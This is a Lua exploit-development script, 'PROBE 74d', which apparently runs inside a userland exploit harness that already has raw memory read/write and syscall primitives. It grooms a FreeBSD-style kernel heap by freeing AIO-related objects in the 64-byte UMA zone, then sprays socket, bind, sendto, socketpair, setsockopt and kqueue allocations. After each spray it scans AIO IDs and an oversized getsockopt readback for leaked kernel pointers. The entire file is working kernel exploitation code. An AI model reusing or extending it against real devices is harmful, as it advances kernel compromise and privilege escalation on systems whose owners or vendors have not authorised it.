-- CRASH_CLASS: LOW
-- PROBE 74d: Socket buffer spray for R-object 64B zone reclamation
--
-- R (48B, 64B UMA zone) stores kernel thread pointers at R+0x00/R+0x08
-- that survive uma_zfree. EVF=128B and namedobj=192B don't match R's 64B
-- zone. This probe tests socket-related kernel allocations that might land
-- in the 64B zone: socket creation, bind, sendto, socketpair, setsockopt,
-- kqueue knotes.
--
-- Strategy per section: free 32 R objects via AIO submit+poll+delete, then
-- spray candidate objects, then submit 32 NEW AIO requests and scan their
-- IDs and any readback for kernel pointer residue.

print("=== PROBE 74d: SOCKET BUFFER SPRAY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function read_624()
    local ret = nil
    pcall(function() ret = mk(624)(uint64(0)) end)
    if ret == nil then return nil end
    return N(ret)
end

-- Open /dev/zero for AIO reads
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do wb(N(p) + i - 1, string.byte(s, i)) end
    wb(N(p) + #s, 0)
    return p
end

local fd_zero = -1
pcall(function() fd_zero = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0))) end)
print("zero_fd=" .. fd_zero)
if fd_zero < 0 then print("FATAL: /dev/zero open failed"); return end

-- Ignore SIGSYS
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)

-- AIO helpers
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function aio_submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(data_buf) + 0x800))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function aio_poll(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
end

local function aio_delete(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or -1
end

local function free_r_objects(count)
    local ids = {}
    for i = 1, count do
        local id = aio_submit_one()
        if id ~= 0 then ids[#ids + 1] = id end
    end
    for _, id in ipairs(ids) do aio_poll(id) end
    local ok_count = 0
    for _, id in ipairs(ids) do
        local st = aio_delete(id)
        if st == 0 then ok_count = ok_count + 1 end
    end
    return ok_count
end

local function submit_and_scan(count, label)
    local kptrs = 0
    local ids = {}
    for i = 1, count do
        local id = aio_submit_one()
        if id ~= 0 then ids[#ids + 1] = id end
    end
    for _, id in ipairs(ids) do
        local h, l = get_hi_lo(uint64(id))
        if is_kptr(uint64(id)) then
            kptrs = kptrs + 1
            print(string.format("  *** KPTR in AIO ID: 0x%04X (h=0x%08X) ***", id, h))
        end
    end
    -- Also check status via 666
    local sts_buf = memory.alloc(count * 8)
    for i = 1, #ids do
        wd(N(sts_buf) + (i - 1) * 4, 0xDEAD)
    end
    for i, id in ipairs(ids) do
        wd(N(one_id), id); wd(N(one_st), 0xDEAD)
        pcall(function() mk(666)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
        local st = rd(N(one_st)) or 0
        local sh, sl = get_hi_lo(uint64(st))
        if is_kptr(uint64(st)) then
            kptrs = kptrs + 1
            print(string.format("  *** KPTR in 666 status[%d]: 0x%08X ***", i, st))
        end
    end
    -- Cleanup: poll + delete
    for _, id in ipairs(ids) do aio_poll(id) end
    for _, id in ipairs(ids) do aio_delete(id) end
    print(string.format("  %s: submitted=%d kptrs=%d", label, #ids, kptrs))
    return kptrs
end

local total_kptrs = 0

-- ============================================================
-- [A] SOCKET CREATION SPRAY
-- ============================================================
print("")
print("[A] Socket creation spray (256 UDP sockets)")
local pre_624 = read_624()
local freed_a = free_r_objects(32)
print("  freed " .. freed_a .. " R objects")

local sock_fds = {}
for i = 1, 256 do
    local fd = -1
    pcall(function() fd = N(mk(97)(uint64(2), uint64(2), uint64(0))) end)
    if fd >= 0 then sock_fds[#sock_fds + 1] = fd end
end
print("  created " .. #sock_fds .. " sockets")
local post_624 = read_624()
print("  624: " .. tostring(pre_624) .. " -> " .. tostring(post_624) .. " (delta=" .. tostring((post_624 or 0) - (pre_624 or 0)) .. ")")

-- Close them all to free socket objects back into their zone
for _, fd in ipairs(sock_fds) do
    pcall(function() mk(6)(uint64(fd)) end)
end
print("  closed " .. #sock_fds .. " sockets")

local ka = submit_and_scan(32, "post-socket-spray")
total_kptrs = total_kptrs + ka

if not alive() then print("DEAD after [A]"); return end

-- ============================================================
-- [B] UDP BIND SPRAY
-- ============================================================
print("")
print("[B] UDP bind spray (64 sockets, each bound)")
pre_624 = read_624()
freed_a = free_r_objects(32)
print("  freed " .. freed_a .. " R objects")

local bind_fds = {}
local addr_buf = memory.alloc(16)
local bind_ok = 0
for i = 1, 64 do
    local fd = -1
    pcall(function() fd = N(mk(97)(uint64(2), uint64(2), uint64(0))) end)
    if fd >= 0 then
        bind_fds[#bind_fds + 1] = fd
        -- sockaddr_in: len=16, family=AF_INET=2, port (big-endian), addr=127.0.0.1
        local port = 1024 + i
        local port_be = math.floor(port / 256) + (port % 256) * 256
        wd(N(addr_buf), 0x00020010)      -- sin_len=16, sin_family=2
        wd(N(addr_buf) + 2, port_be)     -- sin_port (big-endian, overwrite half)
        -- Actually write it byte by byte for correctness
        wb(N(addr_buf), 16)              -- sin_len
        wb(N(addr_buf) + 1, 2)           -- sin_family = AF_INET
        wb(N(addr_buf) + 2, math.floor(port / 256)) -- port high byte
        wb(N(addr_buf) + 3, port % 256)             -- port low byte
        wd(N(addr_buf) + 4, 0x0100007F)  -- 127.0.0.1 in LE
        wd(N(addr_buf) + 8, 0)
        wd(N(addr_buf) + 12, 0)
        local bret = -1
        pcall(function() bret = N(mk(104)(uint64(fd), uint64(N(addr_buf)), uint64(16))) end)
        if bret == 0 then bind_ok = bind_ok + 1 end
    end
end
print("  created " .. #bind_fds .. " sockets, bound " .. bind_ok)
post_624 = read_624()
print("  624: " .. tostring(pre_624) .. " -> " .. tostring(post_624) .. " (delta=" .. tostring((post_624 or 0) - (pre_624 or 0)) .. ")")

local kb = submit_and_scan(32, "post-bind-spray")
total_kptrs = total_kptrs + kb

-- Cleanup bind fds
for _, fd in ipairs(bind_fds) do pcall(function() mk(6)(uint64(fd)) end) end

if not alive() then print("DEAD after [B]"); return end

-- ============================================================
-- [C] SENDTO SPRAY (UDP to loopback)
-- ============================================================
print("")
print("[C] sendto spray (64 UDP sendto calls)")
pre_624 = read_624()
freed_a = free_r_objects(32)
print("  freed " .. freed_a .. " R objects")

local send_fd = -1
pcall(function() send_fd = N(mk(97)(uint64(2), uint64(2), uint64(0))) end)
if send_fd >= 0 then
    local send_buf = memory.alloc(8)
    wd(N(send_buf), 0xCAFECAFE)
    wd(N(send_buf) + 4, 0xBEEFBEEF)

    local dest = memory.alloc(16)
    local send_ok = 0
    for i = 1, 64 do
        local port = 2048 + i
        wb(N(dest), 16); wb(N(dest) + 1, 2)
        wb(N(dest) + 2, math.floor(port / 256)); wb(N(dest) + 3, port % 256)
        wd(N(dest) + 4, 0x0100007F)
        wd(N(dest) + 8, 0); wd(N(dest) + 12, 0)
        local sret = -1
        pcall(function()
            sret = N(mk(133)(uint64(send_fd), uint64(N(send_buf)), uint64(8),
                uint64(0), uint64(N(dest)), uint64(16)))
        end)
        if sret >= 0 then send_ok = send_ok + 1 end
    end
    print("  sent " .. send_ok .. "/64 datagrams")
    pcall(function() mk(6)(uint64(send_fd)) end)
end
post_624 = read_624()
print("  624: " .. tostring(pre_624) .. " -> " .. tostring(post_624) .. " (delta=" .. tostring((post_624 or 0) - (pre_624 or 0)) .. ")")

local kc = submit_and_scan(32, "post-sendto-spray")
total_kptrs = total_kptrs + kc

if not alive() then print("DEAD after [C]"); return end

-- ============================================================
-- [D] SOCKETPAIR SPRAY
-- ============================================================
print("")
print("[D] Socketpair spray (128 pairs = 256 sockets)")
pre_624 = read_624()
freed_a = free_r_objects(32)
print("  freed " .. freed_a .. " R objects")

local pair_buf = memory.alloc(16)
local sp_fds = {}
local sp_ok = 0
for i = 1, 128 do
    wd(N(pair_buf), 0); wd(N(pair_buf) + 4, 0)
    local ret = -1
    pcall(function()
        ret = N(mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(pair_buf))))
    end)
    if ret == 0 then
        sp_ok = sp_ok + 1
        local f0 = rd(N(pair_buf)) or -1
        local f1 = rd(N(pair_buf) + 4) or -1
        if f0 >= 0 then sp_fds[#sp_fds + 1] = f0 end
        if f1 >= 0 then sp_fds[#sp_fds + 1] = f1 end
    end
end
print("  created " .. sp_ok .. " pairs (" .. #sp_fds .. " fds)")
post_624 = read_624()
print("  624: " .. tostring(pre_624) .. " -> " .. tostring(post_624) .. " (delta=" .. tostring((post_624 or 0) - (pre_624 or 0)) .. ")")

local kd = submit_and_scan(32, "post-socketpair-spray")
total_kptrs = total_kptrs + kd

-- Close all socketpair fds
for _, fd in ipairs(sp_fds) do pcall(function() mk(6)(uint64(fd)) end) end

if not alive() then print("DEAD after [D]"); return end

-- ============================================================
-- [E] SETSOCKOPT SPRAY (SO_SNDBUF, SO_RCVBUF)
-- ============================================================
print("")
print("[E] setsockopt spray (64 sockets with SO_SNDBUF)")
pre_624 = read_624()
freed_a = free_r_objects(32)
print("  freed " .. freed_a .. " R objects")

local opt_fds = {}
local opt_buf = memory.alloc(0x100)
local val_buf = memory.alloc(8)
local len_buf = memory.alloc(8)
local opt_ok = 0
for i = 1, 64 do
    local fd = -1
    pcall(function() fd = N(mk(97)(uint64(2), uint64(2), uint64(0))) end)
    if fd >= 0 then
        opt_fds[#opt_fds + 1] = fd
        -- SO_SNDBUF = 0x1001, SOL_SOCKET = 0xFFFF
        wd(N(val_buf), 4096 + i)
        local sret = -1
        pcall(function()
            sret = N(mk(105)(uint64(fd), uint64(0xFFFF), uint64(0x1001),
                uint64(N(val_buf)), uint64(4)))
        end)
        if sret == 0 then opt_ok = opt_ok + 1 end
    end
end
print("  set SO_SNDBUF on " .. opt_ok .. "/" .. #opt_fds .. " sockets")

-- Read back with oversized sentinel buffer to check for stale data
local opt_kptrs = 0
for j = 1, math.min(#opt_fds, 16) do
    local fd = opt_fds[j]
    -- Fill buffer with sentinel
    for off = 0, 0x3C, 4 do wd(N(opt_buf) + off, 0xDEDEDEDE) end
    wd(N(len_buf), 0x40)  -- request 64 bytes
    pcall(function()
        mk(118)(uint64(fd), uint64(0xFFFF), uint64(0x1001),
            uint64(N(opt_buf)), uint64(N(len_buf)))
    end)
    local rlen = rd(N(len_buf)) or 0
    if rlen > 4 then
        print(string.format("  sock[%d] SO_SNDBUF getsockopt len=%d (overcopy!)", j, rlen))
        for off = 4, rlen - 1, 4 do
            local v = rq(uint64(N(opt_buf) + off))
            if v and is_kptr(v) then
                opt_kptrs = opt_kptrs + 1
                print(string.format("    *** KPTR at +%d: %s ***", off, fmt(v)))
            end
        end
    end
end
print("  getsockopt overcopy kptrs: " .. opt_kptrs)
total_kptrs = total_kptrs + opt_kptrs

post_624 = read_624()
print("  624: " .. tostring(pre_624) .. " -> " .. tostring(post_624) .. " (delta=" .. tostring((post_624 or 0) - (pre_624 or 0)) .. ")")

local ke = submit_and_scan(32, "post-setsockopt-spray")
total_kptrs = total_kptrs + ke

for _, fd in ipairs(opt_fds) do pcall(function() mk(6)(uint64(fd)) end) end

if not alive() then print("DEAD after [E]"); return end

-- ============================================================
-- [F] KQUEUE KNOTE SPRAY
-- ============================================================
print("")
print("[F] Kqueue knote spray (64 kqueues with EVFILT_TIMER)")
pre_624 = read_624()
freed_a = free_r_objects(32)
print("  freed " .. freed_a .. " R objects")

local kq_fds = {}
local kev_buf = memory.alloc(0x40)  -- struct kevent = 32 bytes on FreeBSD
local kq_ok = 0
for i = 1, 64 do
    local kqfd = -1
    pcall(function() kqfd = N(mk(362)()) end)
    if kqfd >= 0 then
        kq_fds[#kq_fds + 1] = kqfd
        -- Register EVFILT_TIMER: ident=i, filter=-7, flags=EV_ADD(1)|EV_ONESHOT(0x10)
        -- struct kevent: {uintptr_t ident; short filter; u_short flags; u_int fflags; intptr_t data; void *udata}
        -- On 64-bit: ident(8) filter(2) flags(2) fflags(4) data(8) udata(8) = 32 bytes
        wq(N(kev_buf), uint64(i))              -- ident
        wd(N(kev_buf) + 8, 0x0011FFF9)         -- filter=-7(0xFFF9), flags=EV_ADD|EV_ONESHOT(0x0011)
        wd(N(kev_buf) + 12, 0)                 -- fflags
        wq(N(kev_buf) + 16, uint64(60000))     -- data = 60000ms (long timer so it doesn't fire)
        wq(N(kev_buf) + 24, uint64(0))         -- udata

        local kret = -1
        pcall(function()
            kret = N(mk(363)(uint64(kqfd), uint64(N(kev_buf)), uint64(1),
                uint64(0), uint64(0), uint64(0)))
        end)
        if kret >= 0 then kq_ok = kq_ok + 1 end
    end
end
print("  created " .. #kq_fds .. " kqueues, registered " .. kq_ok .. " timers")
post_624 = read_624()
print("  624: " .. tostring(pre_624) .. " -> " .. tostring(post_624) .. " (delta=" .. tostring((post_624 or 0) - (pre_624 or 0)) .. ")")

local kf = submit_and_scan(32, "post-knote-spray")
total_kptrs = total_kptrs + kf

-- Close kqueues
for _, fd in ipairs(kq_fds) do pcall(function() mk(6)(uint64(fd)) end) end

if not alive() then print("DEAD after [F]"); return end

-- ============================================================
-- [G] SUMMARY
-- ============================================================
print("")
print("[G] SUMMARY")
print("  total kernel pointers found: " .. total_kptrs)
print("  alive=" .. tostring(alive()))
print("")
print("=== PROBE 74d COMPLETE ===")
